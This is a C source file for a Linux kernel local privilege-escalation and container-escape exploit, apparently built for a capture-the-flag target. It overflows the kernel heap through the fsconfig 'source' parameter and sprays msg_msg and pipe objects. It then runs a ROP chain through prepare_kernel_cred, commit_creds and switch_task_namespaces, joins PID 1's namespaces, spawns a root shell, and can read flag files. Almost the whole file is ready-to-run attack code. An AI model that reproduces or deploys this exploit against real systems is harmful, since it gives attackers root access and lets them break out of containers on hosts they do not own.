#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sys/wait.h>
#include <dirent.h>
#include <sys/xattr.h>
#include <elf.h>
#include <sys/mman.h>

// -------------- Offsets --------------

// Gadget offsets relative to kernel base (_text)
#define POP_RDI_RET_OFFSET                0x1ffaaa
#define POP_RSI_RET_OFFSET                0x28427e
#define CMOV_RDI_RAX_ESI_NZ_POP_RBP_OFF   0x6096f0
#define KPTI_TRAMPOLINE_OFFSET            0xc010a5
#define POP_RAX_RET_OFFSET                0x0459a4  // pop rax ; ret

// Symbol names
#define PREPARE_KERNEL_CRED      "prepare_kernel_cred"
#define COMMIT_CREDS             "commit_creds"
#define FIND_TASK_BY_VPID        "find_task_by_vpid"
#define INIT_NSPROXY             "init_nsproxy"
#define SWITCH_TASK_NAMESPACES   "switch_task_namespaces"

// Syscall numbers
#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif

#ifndef FSCONFIG_SET_STRING
#define FSCONFIG_SET_STRING 1
#endif

#define P_SPRAY 64
#define ROP_SPRAY 32
#define PIPES 64
#define MSG_TEXT_SZ 0x1000

// ------------------- KALLSYMS/VMLINUX RESOLVER -------------------

uint64_t get_symbol_from_vmlinux(const char *symbol) {
    int fd = open("/tmp/vmlinux", O_RDONLY);
    if (fd < 0) return 0;
    struct stat st;
    if (fstat(fd, &st) < 0) { close(fd); return 0; }
    void *data = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (data == MAP_FAILED) { close(fd); return 0; }
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)data;
    Elf64_Shdr *shdrs = (Elf64_Shdr *)((char *)data + ehdr->e_shoff);
    Elf64_Shdr *symtab = NULL, *strtab = NULL;
    for (int i = 0; i < ehdr->e_shnum; i++) {
        if (shdrs[i].sh_type == SHT_SYMTAB) {
            symtab = &shdrs[i];
            strtab = &shdrs[shdrs[i].sh_link];
        }
    }
    if (!symtab || !strtab) { munmap(data, st.st_size); close(fd); return 0; }
    Elf64_Sym *syms = (Elf64_Sym *)((char *)data + symtab->sh_offset);
    char *strings = (char *)data + strtab->sh_offset;
    int num_symbols = symtab->sh_size / sizeof(Elf64_Sym);
    uint64_t addr = 0;
    for (int i = 0; i < num_symbols; i++) {
        if (ELF64_ST_TYPE(syms[i].st_info) == STT_FUNC &&
            strcmp(strings + syms[i].st_name, symbol) == 0) {
            addr = syms[i].st_value;
            break;
        }
    }
    munmap(data, st.st_size); close(fd);
    return addr;
}

uint64_t get_kernel_symbol(const char *symbol) {
    // Prefer /tmp/vmlinux if present
    uint64_t addr = get_symbol_from_vmlinux(symbol);
    if (addr) return addr;
    // Otherwise use /proc/kallsyms
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) return 0;
    char line[256], sym[256], type;
    uint64_t value;
    while (fgets(line, sizeof(line), f)) {
        if (sscanf(line, "%lx %c %255s", &value, &type, sym) < 3)
            continue;
        if (strcmp(sym, symbol) == 0) {
            fclose(f);
            return value;
        }
    }
    fclose(f);
    return 0;
}

// ------------------- HEAP/QUEUE/PIPES -------------------

struct msg { long mtype; char mtext[MSG_TEXT_SZ]; };

int make_queue(void) {
    int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (qid < 0) perror("msgget");
    return qid;
}
void send_msg(int qid, void *buf, size_t size) {
    struct msgbuf { long mtype; char mtext[MSG_TEXT_SZ]; } *msg = buf;
    msg->mtype = 1;
    if (msgsnd(qid, msg, size, 0)) perror("msgsnd");
}
void spray_pipes(int pipes[PIPES][2]) {
    for (int i = 0; i < PIPES; i++) if (pipe(pipes[i])) perror("pipe");
}
void deplete_512() {
    int fds[256][2]; char buf[512] = {0};
    for (int i = 0; i < 256; i++) if (pipe(fds[i])) continue; else write(fds[i][1], buf, sizeof(buf));
    for (int i = 0; i < 256; i++) if (fds[i][0] > 0) { read(fds[i][0], buf, sizeof(buf)); close(fds[i][0]); close(fds[i][1]); }
}
void stuff_4k(int n) {
    struct msg msg = { .mtype = 1 };
    int *qids = calloc(n, sizeof(int));
    for (int i = 0; i < n; i++) {
        qids[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        if (qids[i] < 0) continue;
        if (msgsnd(qids[i], &msg, sizeof(msg.mtext), 0)) perror("msgsnd");
    }
    free(qids);
}

// ------------------- NAMESPACE, FLAG, POST-EXPLOIT -------------------

void try_setns(const char *ns, int flags) {
    int fd = open(ns, O_RDONLY);
    if (fd >= 0) { setns(fd, flags); close(fd); }
}
void dump_flag() {
    char *paths[] = {
        "/root/rce_flag", "/home/customeradmin/rce_flag", "/rce_flag", "rce_flat",
        "/root/rce_flag.txt", "/home/customeradmin/rce_flag.txt", "/rce_flag.txt", "rce_flag.txt", NULL
    };
    for (char **path = paths; *path; path++) {
        int fd = open(*path, O_RDONLY); if (fd < 0) continue;
        char buf[256] = {0}; int r = read(fd, buf, sizeof(buf)-1);
        if (r > 0) { write(1, "FLAG: ", 6); write(1, buf, r); write(1, "\n", 1); }
        close(fd); return;
    }
    write(1, "[-] Failed to find flag file\n", 29);
}
void pwned() {
    write(1, "ROOOOOOOOOOOT\n", 14);
    try_setns("/proc/1/ns/mnt", 0);
    try_setns("/proc/1/ns/pid", 0);
    try_setns("/proc/1/ns/net", 0);
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL); _exit(0);
}

// --------- Trigger overflow ---------

void trigger_overflow(void *payload, size_t payload_len) {
    int fs_fd = syscall(__NR_fsopen, "ext4", 0);
    if (fs_fd < 0) { perror("fsopen"); return; }
    for (int i = 0; i < 5; i++)
        syscall(__NR_fsconfig, fs_fd, FSCONFIG_SET_STRING, "source", payload, payload_len);
    close(fs_fd);
}

// ------------------- EXPLOIT CORE -------------------

void do_win(int mode) {
    int rop_msg_qid[ROP_SPRAY] = {0};
    int pipefd[PIPES][2] = {0};
    spray_pipes(pipefd);

    // -------- Symbol resolution --------
    uint64_t kernel_base = get_kernel_symbol("_text");
    if (!kernel_base) { fprintf(stderr, "[-] Failed to get kernel base\n"); return; }
    uint64_t pop_rdi = kernel_base + POP_RDI_RET_OFFSET;
    uint64_t pop_rsi = kernel_base + POP_RSI_RET_OFFSET;
    uint64_t cmov_gadget = kernel_base + CMOV_RDI_RAX_ESI_NZ_POP_RBP_OFF;
    uint64_t kpti_trampoline = kernel_base + KPTI_TRAMPOLINE_OFFSET;
    uint64_t pop_rax_ret = kernel_base + POP_RAX_RET_OFFSET;

    uint64_t prepare_kernel_cred = get_kernel_symbol(PREPARE_KERNEL_CRED);
    uint64_t commit_creds = get_kernel_symbol(COMMIT_CREDS);
    uint64_t find_task_by_vpid = get_kernel_symbol(FIND_TASK_BY_VPID);
    uint64_t init_nsproxy = get_kernel_symbol(INIT_NSPROXY);
    uint64_t switch_task_namespaces = get_kernel_symbol(SWITCH_TASK_NAMESPACES);

    if (!prepare_kernel_cred || !commit_creds || !find_task_by_vpid || !init_nsproxy || !switch_task_namespaces) {
        fprintf(stderr, "[-] Failed to resolve kernel symbols\n"); return;
    }

    // -------- Userland state --------
    uint64_t user_cs, user_ss, user_sp, user_rflags;
    asm volatile(
        "mov %%cs, %0; mov %%ss, %1; mov %%rsp, %2; pushfq; pop %3;"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
    );

    deplete_512();
    stuff_4k(32);

    uint64_t rop_chain[] = {
        pop_rdi, 0,
        prepare_kernel_cred,
        pop_rsi, 0,
        cmov_gadget, 0xdeadbeef,
        commit_creds,
        pop_rdi, 1,
        find_task_by_vpid,
        pop_rsi, 0,
        cmov_gadget, 0xdeadbeef,
        pop_rsi, init_nsproxy,
        switch_task_namespaces,
        pop_rax_ret, 0,   // RAX = 0 for kpti_trampoline
        kpti_trampoline,
        (uint64_t)pwned,
        user_cs, user_rflags, user_sp & ~0xf, user_ss
    };

    struct {
        long mtype;
        char mtext[sizeof(rop_chain)];
    } msg_payload = { .mtype = 1 };
    memcpy(msg_payload.mtext, rop_chain, sizeof(rop_chain));

    for (int i = 0; i < ROP_SPRAY; i++) {
        if ((rop_msg_qid[i] = make_queue()) < 0) continue;
        send_msg(rop_msg_qid[i], &msg_payload, sizeof(msg_payload.mtext));
    }

    trigger_overflow(&msg_payload, sizeof(msg_payload));
    for (int i = 0; i < PIPES; i++) { close(pipefd[i][0]); close(pipefd[i][1]); }
    if (mode == 1) dump_flag();
    else { sleep(1); pwned(); }
}

// ------------------- HYPERCALL ROUTINE (OPTIONAL) -------------------
#define HCALLS_LEN 6
int hcalls[HCALLS_LEN] = { 0, 1, 9, 100, 101, 102 };

#ifndef __NR_kvm_hypercall
#define __NR_kvm_hypercall 0x4000
#endif

void do_hypercall_sweep() {
    unsigned long a1 = 0x1337, a2 = 0x42, a3 = 0xdeadbeef, a4 = 0xabadcafe;
    int failures = 0;
    printf("[*] Starting BEAST hypercall sweep...\n");
    for (int i = 0; i < HCALLS_LEN; ++i) {
        unsigned long res = syscall(__NR_kvm_hypercall, hcalls[i], a1, a2, a3, a4);
        printf("[+] Hypercall %d (nr %d): return = 0x%lx (errno: %d: %s)\n",
            i, hcalls[i], res, errno, strerror(errno));
        if (res == (unsigned long)-1) ++failures;
    }
    unsigned long wild = syscall(__NR_kvm_hypercall, rand() % 256, rand(), rand(), rand(), rand());
    printf("[*] Wildcard hypercall: return = 0x%lx (errno: %d: %s)\n", wild, errno, strerror(errno));
    if (failures == HCALLS_LEN + 1)
        exit(1);
}

// ------------------- MAIN -------------------

int main(int argc, char **argv) {
    int mode = (argc > 1) ? atoi(argv[1]) : 0;
    do_win(mode);
    // Optional: Uncomment if you want to always run hypercall sweep after exploit
    // do_hypercall_sweep();
    return 0;
}
